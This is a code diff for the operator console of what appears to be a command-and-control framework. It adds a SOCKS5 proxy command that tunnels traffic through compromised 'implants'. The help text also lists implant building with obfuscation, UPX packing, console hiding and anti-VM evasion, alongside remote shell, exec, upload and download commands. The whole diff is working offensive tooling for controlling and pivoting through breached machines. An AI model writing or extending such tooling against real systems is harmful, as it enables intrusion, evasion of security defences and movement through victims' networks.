@@ -26,8 +26,9 @@ var commandHelp = map[string]string{
 	"upload":   "upload <local-path> <remote-path> — upload file to implant",
 	"generate":   "generate [flags] — build an implant (all flags optional)\n  --os <string>      target OS: linux, darwin, windows (default: linux)\n  --arch <string>    target arch: amd64, arm64 (default: amd64)\n  --output <path>    output path (default: ./implant)\n  --pubkey <path>    operator public key (default: ~/.arachne/operator.pub)\n  --upx              enable UPX compression (default: true)\n  --obfuscate        obfuscate the binary with garble (auto-installs if missing)\n  --quiet            suppress output, detach from terminal, hide console on Windows\n  --antivm           enable VM detection (pure Go, 65+ techniques, VMAware scoring)",
 	"regenerate": "regenerate — regenerate operator keypair (old implants will not call back)",
-	"help":       "help [command] — show this help or help for a specific command",
-	"exit":     "exit — quit the console",
+	"socks":     "socks start|list|stop — manage SOCKS5 proxies (use 'socks help' for details)",
+	"help":      "help [command] — show this help or help for a specific command",
+	"exit":      "exit — quit the console",
 }
 
 func checkHelp(args []string) bool {
@@ -105,7 +106,7 @@ func (o *Operator) RunCLI() {
 				continue
 			}
 			fmt.Println("Commands:")
-			for _, name := range []string{"list", "select", "ps", "ls", "cd", "pwd", "shell", "portfwd", "exec", "download", "upload", "generate", "regenerate", "help", "exit"} {
+			for _, name := range []string{"list", "select", "ps", "ls", "cd", "pwd", "shell", "portfwd", "socks", "exec", "download", "upload", "generate", "regenerate", "help", "exit"} {
 				line := commandHelp[name]
 				if i := strings.IndexByte(line, '\n'); i >= 0 {
 					line = line[:i]
@@ -265,6 +266,117 @@ func (o *Operator) RunCLI() {
 			}
 			if err := o.Portfwd(selected.PeerID, localPort, args[1]); err != nil {
 				fmt.Printf("portfwd error: %v\n", err)
+			}
+
+		case "socks":
+			if len(args) == 0 || args[0] == "help" || checkHelp(args) {
+				fmt.Println("  socks <subcommand> [args]")
+				fmt.Println("  subcommands:")
+				fmt.Println("    start <idx|random> <port>  — start SOCKS5 proxy (uses saved credentials if available)")
+				fmt.Println("    list                       — show running SOCKS5 proxies")
+				fmt.Println("    stop <port>                — stop a running SOCKS5 proxy")
+				fmt.Println("    reset-creds                — clear saved credentials (re-prompt on next start)")
+				continue
+			}
+
+			switch args[0] {
+			case "start":
+				if len(args) < 2 {
+					fmt.Println("usage: socks start <idx|random> <port>")
+					continue
+				}
+				idArg := args[1]
+				port := 1080
+				if len(args) > 2 {
+					if p, err := strconv.Atoi(args[2]); err == nil && p > 0 && p <= 65535 {
+						port = p
+					} else {
+						fmt.Printf("bad port: %s\n", args[2])
+						continue
+					}
+				}
+
+				creds, _ := LoadSocksCreds()
+				var username, password string
+				if creds != nil {
+					username = creds.Username
+					fmt.Printf("using saved credentials (user: %s)\n", username)
+					pass, err := line.Prompt("SOCKS password: ")
+					if err != nil {
+						continue
+					}
+					if !checkPassword(pass, creds.PasswordHash) {
+						fmt.Println("incorrect password")
+						continue
+					}
+					password = pass
+				} else {
+					u, err := line.Prompt("SOCKS username: ")
+					if err != nil {
+						continue
+					}
+					p, err := line.Prompt("SOCKS password: ")
+					if err != nil {
+						continue
+					}
+					username = u
+					password = p
+				}
+
+				targetID := idArg
+				if idArg != "random" {
+					peerID, rec, err := o.pickImplantPeerID(idArg)
+					if err != nil {
+						fmt.Printf("socks: %v\n", err)
+						continue
+					}
+					targetID = peerID
+					fmt.Printf("using implant %s@%s\n", rec.Name, rec.Hostname)
+				} else {
+					fmt.Println("using random implant per request")
+				}
+				fmt.Printf("starting SOCKS5 proxy on 127.0.0.1:%d...\n", port)
+				if err := o.SocksStart(targetID, port, username, password); err != nil {
+					fmt.Printf("socks start error: %v\n", err)
+				}
+
+			case "list":
+				proxies := o.SocksList()
+				if len(proxies) == 0 {
+					fmt.Println("no SOCKS5 proxies running")
+				} else {
+					fmt.Println("SOCKS5 proxies:")
+					for _, p := range proxies {
+						uptime := time.Since(p.StartTime).Round(time.Second)
+						fmt.Printf("  %d: %s -> implant %s (up %s)\n", p.Port, p.Username, p.ImplantID, uptime)
+					}
+				}
+
+			case "stop":
+				if len(args) < 2 {
+					fmt.Println("usage: socks stop <port>")
+					continue
+				}
+				port, err := strconv.Atoi(args[1])
+				if err != nil || port < 1 || port > 65535 {
+					fmt.Printf("bad port: %s\n", args[1])
+					continue
+				}
+				if err := o.SocksStop(port); err != nil {
+					fmt.Printf("socks stop error: %v\n", err)
+				} else {
+					fmt.Printf("SOCKS5 proxy on port %d stopped\n", port)
+				}
+
+			case "reset-creds":
+				if err := ClearSocksCreds(); err != nil {
+					fmt.Printf("reset-creds error: %v\n", err)
+				} else {
+					fmt.Println("SOCKS credentials cleared")
+				}
+
+			default:
+				fmt.Printf("unknown socks subcommand: %s (try 'socks help')\n", args[0])
 			}
 
 		case "download":
